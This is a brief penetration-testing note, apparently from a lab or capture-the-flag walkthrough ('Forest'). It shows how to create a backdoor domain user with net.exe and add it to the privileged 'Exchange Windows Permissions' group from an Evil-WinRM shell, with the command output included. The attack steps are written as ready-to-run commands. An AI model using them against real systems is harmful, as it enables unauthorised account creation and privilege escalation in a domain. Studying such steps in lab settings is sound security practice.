## User create
If we are able to create a user it is as simple as using the net.exe windows utility:
```powershell
net user shuciran shucir4n /add
```
## Add user to a group
If there is a group in the domain with some privileges, we can add a user to such group (if we have such permissions):
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" shuciran /add
The command completed successfully.
```
If all goes as planned we'll get this output:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user shuciran
User name                    shuciran
...
Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
```
Examples:
[[Forest#^80fd2e]]